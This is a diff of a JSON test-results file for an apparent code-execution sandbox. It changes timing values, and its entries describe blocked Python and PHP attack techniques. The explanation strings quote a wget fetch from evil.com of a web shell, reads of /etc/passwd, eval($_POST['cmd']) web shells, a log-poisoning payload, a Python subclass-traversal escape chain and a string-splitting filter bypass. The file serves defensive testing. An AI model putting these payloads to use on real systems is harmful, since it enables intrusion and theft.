       "explanation": "\n      🎯 ATTACK: Local Namespace Access\n      \n      How hackers use this:\n      locals() exposes local variables which might contain\n      sensitive data or useful references.\n      \n      Real-world impact:\n      - Find variables with secrets\n      - Discover local module imports\n      - Information disclosure\n    "
     },
     {
@@ -1605,7 +1605,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Variable Dictionary Access\n      \n      How hackers use this:\n      vars() returns __dict__ of an object or local namespace.\n      Exposes internal object state.\n      \n      Real-world impact:\n      - Access object internals\n      - Modify private attributes\n      - Similar to globals()/locals()\n    "
     },
     {
@@ -1616,7 +1616,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Attribute Enumeration\n      \n      How hackers use this:\n      dir() lists all attributes of an object.\n      Used to discover available functions and methods.\n      \n      Real-world impact:\n      - Enumerate available functions\n      - Find undocumented capabilities\n      - Map object interfaces\n    "
     },
     {
@@ -1627,7 +1627,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Dynamic Attribute Access\n      \n      How hackers use this:\n      getattr() retrieves attributes by name, enabling dynamic\n      access to dangerous functions.\n      \n      Real-world impact:\n      - Access blocked attributes dynamically\n      - Bypass direct attribute blocking\n      - Core sandbox escape technique\n    "
     },
     {
@@ -1638,7 +1638,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Class Hierarchy Traversal\n      \n      How hackers use this:\n      __subclasses__() returns all subclasses of a class.\n      Used to find classes with dangerous capabilities.\n      \n      Real-world impact:\n      - Find classes with file access (like FileLoader)\n      - Locate classes with code execution methods\n      - Classic Python sandbox escape\n      \n      Common pattern:\n      tuple.__mro__[1].__subclasses__() → find os._wrap_close → access os\n    "
     },
     {
@@ -1649,7 +1649,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Method Resolution Order Traversal\n      \n      How hackers use this:\n      __mro__ shows the inheritance chain. Combined with __subclasses__,\n      it enables traversing the entire class hierarchy.\n      \n      Real-world impact:\n      - Navigate to object base class\n      - Find all classes in the system\n      - Gateway to dangerous classes\n    "
     },
     {
@@ -1660,7 +1660,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 11,
       "explanation": "\n      🎯 ATTACK: Builtins Module Access\n      \n      How hackers use this:\n      __builtins__ contains all built-in functions including\n      dangerous ones like __import__, eval, exec.\n      \n      Real-world impact:\n      - Access dangerous built-in functions\n      - Even if direct names are blocked\n      - __builtins__.__import__ is common bypass\n    "
     },
     {
@@ -1671,7 +1671,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: AST Manipulation\n      \n      How hackers use this:\n      ast module parses Python code into abstract syntax trees.\n      Can be used to generate or modify code dynamically.\n      \n      Real-world impact:\n      - Generate malicious code programmatically\n      - Modify legitimate code at runtime\n      - Create obfuscated payloads\n    "
     },
     {
@@ -1682,7 +1682,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Bytecode Disassembly\n      \n      How hackers use this:\n      dis module shows Python bytecode. Useful for understanding\n      how security measures work to bypass them.\n      \n      Real-world impact:\n      - Reverse engineer security code\n      - Understand bytecode for manipulation\n      - Educational for creating exploits\n    "
     },
     {
@@ -1693,7 +1693,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Code Object Creation\n      \n      How hackers use this:\n      CodeType creates raw code objects from components.\n      Can craft malicious bytecode directly.\n      \n      Real-world impact:\n      - Create executable code objects\n      - Bypass source code analysis\n      - Inject bytecode directly\n    "
     },
     {
@@ -1704,7 +1704,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Signal Handler Code Execution\n      \n      How hackers use this:\n      Signal handlers execute when signals are received.\n      Malicious handlers can trigger on process events.\n      \n      Real-world impact:\n      - Execute code on termination\n      - Persistence through signal handling\n      - Triggered by external events\n    "
     },
     {
@@ -1715,7 +1715,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Exit Handler Registration\n      \n      How hackers use this:\n      atexit registers functions to run at program exit.\n      Malicious exit handlers persist until shutdown.\n      \n      Real-world impact:\n      - Execute code at termination\n      - Guaranteed execution even on errors\n      - Cleanup-based persistence\n    "
     },
     {
@@ -1726,7 +1726,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 18,
+      "duration": 44,
       "explanation": "\n      ✅ SAFE: Basic Output\n      \n      This is legitimate code that should execute:\n      print() is fundamental for learning Python and\n      debugging code. Completely safe.\n    ",
       "stdout": "Hello, World!",
       "stderr": "",
@@ -1740,7 +1740,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 15,
+      "duration": 45,
       "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for any programming.\n    ",
       "stdout": "4",
       "stderr": "",
@@ -1754,7 +1754,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 16,
+      "duration": 56,
       "explanation": "\n      ✅ SAFE: List Comprehension\n      \n      This is legitimate code that should execute:\n      List comprehensions are Pythonic and commonly\n      taught in introductory courses.\n    ",
       "stdout": "[0, 1, 4, 9, 16]",
       "stderr": "",
@@ -1768,7 +1768,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 17,
+      "duration": 60,
       "explanation": "\n      ✅ SAFE: Object-Oriented Programming\n      \n      This is legitimate code that should execute:\n      Class definitions and object creation are\n      fundamental to Python development.\n    ",
       "stdout": "7",
       "stderr": "",
@@ -1782,7 +1782,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 16,
+      "duration": 119,
       "explanation": "\n      ✅ SAFE: Lambda Functions\n      \n      This is legitimate code that should execute:\n      Lambda expressions are useful for simple\n      anonymous functions.\n    ",
       "stdout": "10",
       "stderr": "",
@@ -1796,7 +1796,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Direct System Command Execution\n      \n      How hackers use this:\n      system() executes a shell command and displays the output.\n      It's one of the most common PHP RCE vectors.\n      \n      Real-world impact:\n      - Execute any command with web server privileges\n      - system('cat /etc/passwd') reveals user accounts\n      - system('wget evil.com/shell.php -O shell.php') installs backdoors\n      \n      Historical note:\n      Countless web shell exploits start with system() calls.\n      It's in the top 5 most dangerous PHP functions.\n    "
     },
     {
@@ -1807,7 +1807,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Command Execution with Output Capture\n      \n      How hackers use this:\n      exec() runs a command and captures output into an array.\n      Attackers use it to enumerate files and extract data.\n      \n      Real-world impact:\n      - Capture command output for processing\n      - Array output is easier to parse\n      - Enumerate directories, find config files\n    "
     },
     {
@@ -1818,7 +1818,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 11,
       "explanation": "\n      🎯 ATTACK: Shell Command with String Output\n      \n      How hackers use this:\n      shell_exec() returns command output as a single string.\n      Equivalent to backtick operator.\n      \n      Real-world impact:\n      - Simple output capture\n      - Easy to echo directly\n      - Often used in web shells\n    "
     },
     {
@@ -1829,7 +1829,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Raw Command Output Passthrough\n      \n      How hackers use this:\n      passthru() passes command output directly to the browser.\n      Useful for binary output or large data streams.\n      \n      Real-world impact:\n      - Stream files directly to attacker\n      - No memory buffering issues\n      - Good for exfiltrating binary files\n    "
     },
     {
@@ -1840,7 +1840,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Process Pipe Open\n      \n      How hackers use this:\n      popen() opens a pipe to a process for reading or writing.\n      Enables interactive command communication.\n      \n      Real-world impact:\n      - Stream data to/from processes\n      - Interactive shell communication\n      - Long-running process control\n    "
     },
     {
@@ -1851,7 +1851,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Full Process Control\n      \n      How hackers use this:\n      proc_open() provides complete control over process I/O.\n      Most powerful process execution function in PHP.\n      \n      Real-world impact:\n      - Control stdin, stdout, stderr separately\n      - Create interactive shells\n      - Complex process pipelines\n    "
     },
     {
@@ -1862,7 +1862,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Process Control Execution\n      \n      How hackers use this:\n      pcntl_exec() replaces the current process with a new one.\n      Part of the pcntl extension for Unix process control.\n      \n      Real-world impact:\n      - Replace PHP process with shell\n      - Execute binaries directly\n      - Harder to trace\n    "
     },
     {
@@ -1873,7 +1873,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Backtick Command Execution\n      \n      How hackers use this:\n      Backticks are a shorthand for shell_exec().\n      Less obvious than function calls.\n      \n      Real-world impact:\n      - Subtle command execution\n      - Often missed in code review\n      - Equivalent to shell_exec()\n    "
     },
     {
@@ -1884,7 +1884,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Expect Extension Process Control\n      \n      How hackers use this:\n      The expect extension can spawn interactive processes.\n      Used for automation but dangerous in web contexts.\n      \n      Real-world impact:\n      - Spawn interactive shells\n      - Automate system interactions\n      - Less common, may bypass filters\n    "
     },
     {
@@ -1895,7 +1895,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Dynamic Code Execution\n      \n      How hackers use this:\n      eval() executes a string as PHP code.\n      The most dangerous PHP function for RCE.\n      \n      Real-world impact:\n      - Execute any PHP code from strings\n      - Web shells use eval($_POST['cmd'])\n      - Bypass any input filters\n      \n      Famous exploits:\n      Many WordPress/Joomla exploits use eval injection\n    "
     },
     {
@@ -1906,7 +1906,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Assert Code Execution (PHP < 8)\n      \n      How hackers use this:\n      In PHP < 8, assert() with a string argument executes it as code.\n      Often overlooked as a security risk.\n      \n      Real-world impact:\n      - Eval alternative that may bypass filters\n      - Works in older PHP versions\n      - Less suspicious function name\n    "
     },
     {
@@ -1917,7 +1917,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Dynamic Function Creation\n      \n      How hackers use this:\n      create_function() builds functions from strings (like eval).\n      Deprecated but still works in many environments.\n      \n      Real-world impact:\n      - Create and execute malicious functions\n      - Bypass eval() blocking\n      - Anonymous function with code injection\n    "
     },
     {
@@ -1928,7 +1928,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Regex Eval Modifier\n      \n      How hackers use this:\n      The /e modifier (deprecated) evaluates the replacement as PHP.\n      Classic PHP vulnerability vector.\n      \n      Real-world impact:\n      - Execute code in regex replacements\n      - Many old exploits use this\n      - Removed in PHP 7, but legacy code exists\n    "
     },
     {
@@ -1939,7 +1939,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Regex Callback Execution\n      \n      How hackers use this:\n      preg_replace_callback() calls a function for each match.\n      The callback can contain malicious code.\n      \n      Real-world impact:\n      - Execute code for each regex match\n      - Modern alternative to /e modifier\n      - Function-based code injection\n    "
     },
     {
@@ -1950,7 +1950,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Dynamic Function Call\n      \n      How hackers use this:\n      call_user_func() calls any function by name.\n      Enables calling dangerous functions dynamically.\n      \n      Real-world impact:\n      - Call any function by string name\n      - Bypass direct function name filters\n      - call_user_func('sys'.'tem', 'id') bypasses simple checks\n    "
     },
     {
@@ -1961,7 +1961,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Dynamic Function Call with Array Args\n      \n      How hackers use this:\n      call_user_func_array() passes arguments as an array.\n      Useful for variable argument counts.\n      \n      Real-world impact:\n      - Same as call_user_func with array arguments\n      - More flexible for complex payloads\n    "
     },
     {
@@ -1972,7 +1972,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Array Function Callback Abuse\n      \n      How hackers use this:\n      array_map() applies a callback to each array element.\n      Using 'system' as callback executes commands.\n      \n      Real-world impact:\n      - Execute commands for each array element\n      - Less obvious than direct system() call\n      - Often missed in code audits\n    "
     },
     {
@@ -1983,7 +1983,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Array Filter Callback Abuse\n      \n      How hackers use this:\n      array_filter() can use a callback for filtering.\n      Using 'system' executes each element as a command.\n      \n      Real-world impact:\n      - Same pattern as array_map abuse\n      - Commands in array are executed\n      - Callback-based code injection\n    "
     },
     {
@@ -1994,7 +1994,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Array Walk Callback Abuse\n      \n      How hackers use this:\n      array_walk() applies callback to each element in place.\n      Another array function abusable for code execution.\n      \n      Real-world impact:\n      - Similar to array_map\n      - Modifies array in place\n      - Callback receives value and key\n    "
     },
     {
@@ -2005,7 +2005,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Array Reduce Callback Abuse\n      \n      How hackers use this:\n      array_reduce() with a malicious callback executes\n      code while appearing to do array reduction.\n      \n      Real-world impact:\n      - Hide execution in reduction logic\n      - Appears to be data processing\n      - Callback receives items sequentially\n    "
     },
     {
@@ -2016,7 +2016,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Sort Callback Abuse\n      \n      How hackers use this:\n      Sorting functions accept comparison callbacks.\n      Malicious callbacks execute during sort operations.\n      \n      Real-world impact:\n      - Execute during sort comparison\n      - Very subtle attack vector\n      - Appears to be innocent sorting\n    "
     },
     {
@@ -2027,7 +2027,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Associative Sort Callback Abuse\n      \n      How hackers use this:\n      uasort() maintains key associations while sorting.\n      Same callback abuse as usort().\n      \n      Real-world impact:\n      - Same as usort\n      - Preserves array keys\n      - Another sorting-based vector\n    "
     },
     {
@@ -2038,7 +2038,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Key Sort Callback Abuse\n      \n      How hackers use this:\n      uksort() sorts by keys using a callback.\n      Callback abuse works here too.\n      \n      Real-world impact:\n      - Sort by keys with code execution\n      - Complete set of sort function abuse\n    "
     },
     {
@@ -2049,7 +2049,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 25,
       "explanation": "\n      🎯 ATTACK: Shutdown Handler Registration\n      \n      How hackers use this:\n      Register a function to run when PHP shuts down.\n      Malicious handlers persist until script ends.\n      \n      Real-world impact:\n      - Execute code at script termination\n      - Guaranteed execution even on errors\n      - Cleanup-based persistence\n    "
     },
     {
@@ -2060,7 +2060,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 76,
       "explanation": "\n      🎯 ATTACK: Tick Function Registration\n      \n      How hackers use this:\n      Tick functions run every N statements.\n      Can execute code repeatedly during execution.\n      \n      Real-world impact:\n      - Repeated code execution\n      - Monitoring/interception capabilities\n      - Less common, may bypass filters\n    "
     },
     {
@@ -2071,7 +2071,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: File Content Reading\n      \n      How hackers use this:\n      file_get_contents() reads entire files into strings.\n      Most common file reading function in PHP.\n      \n      Real-world impact:\n      - Read /etc/passwd for user enumeration\n      - Access application source code\n      - Read config files with credentials\n      - Database connection strings\n    "
     },
     {
@@ -2082,7 +2082,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: File Writing / Web Shell Creation\n      \n      How hackers use this:\n      file_put_contents() writes data to files.\n      Primary method for creating web shells.\n      \n      Real-world impact:\n      - Create PHP web shells\n      - Modify existing PHP files\n      - Write SSH keys for persistence\n      - Create cron jobs\n    "
     },
     {
@@ -2093,7 +2093,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: File Line Reading\n      \n      How hackers use this:\n      file() reads a file into an array of lines.\n      Easy to process file contents.\n      \n      Real-world impact:\n      - Read files as arrays\n      - Process line by line\n      - Easier parsing than file_get_contents\n    "
     },
     {
@@ -2104,7 +2104,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Low-Level File Operations\n      \n      How hackers use this:\n      fopen/fread provide fine-grained file access.\n      Can read specific portions of files.\n      \n      Real-world impact:\n      - Streaming file access\n      - Read large files in chunks\n      - Seek to specific positions\n    "
     },
     {
@@ -2115,7 +2115,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Direct File Output\n      \n      How hackers use this:\n      readfile() outputs a file directly to the browser.\n      No buffering, efficient for large files.\n      \n      Real-world impact:\n      - Stream files to attacker\n      - No memory buffering\n      - Good for binary exfiltration\n    "
     },
     {
@@ -2126,7 +2126,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Local File Inclusion (LFI)\n      \n      How hackers use this:\n      include() loads and executes a PHP file.\n      With non-PHP files, content is displayed.\n      \n      Real-world impact:\n      - LFI to RCE via log poisoning\n      - Read sensitive files\n      - Include remote files if enabled\n      - Major vulnerability class\n    "
     },
     {
@@ -2137,7 +2137,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Log Poisoning LFI\n      \n      How hackers use this:\n      Include log files that contain attacker-controlled content.\n      If PHP code was injected into logs, it executes.\n      \n      Real-world impact:\n      - Classic LFI to RCE technique\n      - Inject <?php system($_GET[c])?> via User-Agent\n      - Then include the log file\n    "
     },
     {
@@ -2148,7 +2148,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Required File Inclusion\n      \n      How hackers use this:\n      require() is like include() but fatal on failure.\n      Same LFI vulnerability pattern.\n      \n      Real-world impact:\n      - Same as include() attacks\n      - Script dies if file not found\n      - Often used for critical includes\n    "
     },
     {
@@ -2159,7 +2159,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Directory Enumeration\n      \n      How hackers use this:\n      scandir() lists directory contents.\n      Essential for mapping the file system.\n      \n      Real-world impact:\n      - Discover file structure\n      - Find config files, backups\n      - Locate writable directories\n    "
     },
     {
@@ -2170,7 +2170,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Pattern-Based File Discovery\n      \n      How hackers use this:\n      glob() finds files matching patterns.\n      Powerful for discovering specific file types.\n      \n      Real-world impact:\n      - Find all .php files: glob('*.php')\n      - Find config: glob('/etc/*.conf')\n      - Recursive search with patterns\n    "
     },
     {
@@ -2181,7 +2181,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Source Code Disclosure\n      \n      How hackers use this:\n      show_source() displays PHP files with syntax highlighting.\n      Reveals application source code.\n      \n      Real-world impact:\n      - Read PHP source code\n      - Find hardcoded credentials\n      - Discover vulnerability patterns\n      - Understand application logic\n    "
     },
     {
@@ -2192,7 +2192,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Syntax Highlighted Source Disclosure\n      \n      How hackers use this:\n      highlight_file() is alias of show_source().\n      Commonly targeted for WordPress configs.\n      \n      Real-world impact:\n      - WordPress database credentials\n      - Displayed in formatted HTML\n      - API keys and secrets\n    "
     },
     {
@@ -2203,7 +2203,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: File Upload Bypass\n      \n      How hackers use this:\n      move_uploaded_file() moves uploaded files.\n      Can be abused to place web shells.\n      \n      Real-world impact:\n      - Move uploaded shell to web directory\n      - Bypass upload validation\n      - Classic upload vulnerability exploitation\n    "
     },
     {
@@ -2214,7 +2214,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: File Copying\n      \n      How hackers use this:\n      copy() duplicates files to new locations.\n      Move sensitive files to accessible locations.\n      \n      Real-world impact:\n      - Copy sensitive files to web root\n      - Make private files publicly accessible\n      - Duplicate for exfiltration\n    "
     },
     {
@@ -2225,7 +2225,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: File Deletion\n      \n      How hackers use this:\n      unlink() deletes files.\n      Destructive attack or evidence removal.\n      \n      Real-world impact:\n      - Delete application files\n      - Remove logs to cover tracks\n      - Denial of service by deletion\n    "
     },
     {
@@ -2236,7 +2236,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Symlink Attack\n      \n      How hackers use this:\n      symlink() creates symbolic links.\n      Link sensitive files to accessible locations.\n      \n      Real-world impact:\n      - Expose /etc/passwd via web server\n      - Bypass directory restrictions\n      - Classic symlink vulnerability\n    "
     },
     {
@@ -2247,7 +2247,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Raw Socket Connection\n      \n      How hackers use this:\n      fsockopen() creates network connections.\n      Used for reverse shells and data exfiltration.\n      \n      Real-world impact:\n      - Reverse shell connections\n      - HTTP requests to C2 servers\n      - Port scanning\n      - SSRF attacks\n    "
     },
     {
@@ -2258,7 +2258,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Persistent Socket Connection\n      \n      How hackers use this:\n      pfsockopen() creates persistent connections.\n      Maintained across requests for efficiency.\n      \n      Real-world impact:\n      - Long-lived connections to attackers\n      - Efficient repeated communication\n      - Connection pooling for attacks\n    "
     },
     {
@@ -2269,7 +2269,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: cURL HTTP Requests\n      \n      How hackers use this:\n      cURL is powerful for HTTP requests.\n      Can exfiltrate data or download payloads.\n      \n      Real-world impact:\n      - Send stolen data to attacker\n      - Download malware\n      - SSRF attacks\n      - Complex HTTP operations\n    "
     },
     {
@@ -2280,7 +2280,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Stream Socket Client\n      \n      How hackers use this:\n      stream_socket_client() is a modern socket API.\n      Supports TCP, UDP, and Unix sockets.\n      \n      Real-world impact:\n      - Alternative to fsockopen\n      - More protocol options\n      - Streaming data connections\n    "
     },
     {
@@ -2291,7 +2291,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Socket Server Creation\n      \n      How hackers use this:\n      Creates a listening socket server.\n      Can receive incoming connections.\n      \n      Real-world impact:\n      - Create backdoor listeners\n      - Bind shell for remote access\n      - Internal network pivot points\n    "
     },
     {
@@ -2302,7 +2302,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: FTP Connection\n      \n      How hackers use this:\n      FTP functions enable file transfers.\n      Exfiltrate files or download malware.\n      \n      Real-world impact:\n      - Upload stolen files\n      - Download additional tools\n      - Traditional protocol may bypass monitoring\n    "
     },
     {
@@ -2313,7 +2313,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Email Data Exfiltration\n      \n      How hackers use this:\n      mail() sends emails, potentially with stolen data.\n      Can also be used for spam.\n      \n      Real-world impact:\n      - Email sensitive files\n      - Header injection attacks\n      - Spam relay abuse\n    "
     },
     {
@@ -2324,7 +2324,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 1,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Stream-Based URL Fetching\n      \n      How hackers use this:\n      Streams can open URLs like files.\n      Alternative to cURL/file_get_contents.\n      \n      Real-world impact:\n      - Download remote content\n      - SSRF attacks\n      - May bypass URL function filters\n    "
     },
     {
@@ -2335,7 +2335,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Environment Variable Access\n      \n      How hackers use this:\n      $_ENV contains environment variables with\n      potentially sensitive configuration.\n      \n      Real-world impact:\n      - Read API keys\n      - Database credentials\n      - Cloud service tokens\n      - Application secrets\n    "
     },
     {
@@ -2346,7 +2346,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Server Information Disclosure\n      \n      How hackers use this:\n      $_SERVER contains server and request information.\n      Useful for reconnaissance.\n      \n      Real-world impact:\n      - Reveal server paths\n      - Document root location\n      - Server software version\n      - HTTP headers\n    "
     },
     {
@@ -2357,7 +2357,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Environment Variable Reading\n      \n      How hackers use this:\n      getenv() reads specific environment variables.\n      Targeted access to known secrets.\n      \n      Real-world impact:\n      - Read specific credentials\n      - Check for specific environment\n      - Targeted information gathering\n    "
     },
     {
@@ -2368,7 +2368,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 1,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Environment Variable Manipulation\n      \n      How hackers use this:\n      putenv() modifies environment variables.\n      Can enable exploitation of other vulnerabilities.\n      \n      Real-world impact:\n      - LD_PRELOAD injection for RCE\n      - Modify PATH for command hijacking\n      - Change application behavior\n    "
     },
     {
@@ -2379,7 +2379,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Apache Environment Access\n      \n      How hackers use this:\n      Apache-specific environment access.\n      May contain additional server info.\n      \n      Real-world impact:\n      - Apache-specific variables\n      - Additional reconnaissance data\n      - Server configuration details\n    "
     },
     {
@@ -2390,7 +2390,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Apache Environment Manipulation\n      \n      How hackers use this:\n      Set Apache environment variables.\n      Can affect request processing.\n      \n      Real-world impact:\n      - Modify Apache behavior\n      - Affect downstream processing\n      - Environment-based attacks\n    "
     },
     {
@@ -2401,7 +2401,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
